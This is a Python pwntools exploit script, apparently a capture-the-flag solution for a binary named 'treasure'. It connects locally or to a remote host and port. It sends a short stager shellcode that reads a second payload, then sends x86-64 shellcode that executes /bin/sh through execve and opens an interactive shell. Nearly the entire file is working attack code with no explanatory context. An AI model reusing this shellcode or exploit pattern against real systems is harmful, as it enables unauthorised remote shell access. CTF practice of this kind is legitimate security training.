#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./treasure"
elf=ELF(pwn_file)
libc= elf.libc #=ELF("./libc.so.6")
#heap_add=0
#stack_add=0

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("58.20.46.149", 44323)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

# mov dl, 0xff
# xor rax,rax
# mov rsi, rdx

shellcode="""
    xchg rsi,rdx
    mov dil, 0x00
    syscall
    nop
"""
r_shellcode = """
    call here
   .ascii "/bin/sh"
   .byte 0
here:
    pop rdi
    xor rsi,rsi
    xor rdx, rdx
    mov rax,0x3b
    syscall
"""
r_sh = asm(r_shellcode, arch='amd64')

sh = asm(shellcode,arch="amd64")
print len(sh)
r.sendlineafter("will you continue?(enter 'n' to quit) :", 'y')
debug()
r.sendafter("start!!!!", sh)
r.sendline(8*'a' +  r_sh)

r.interactive()
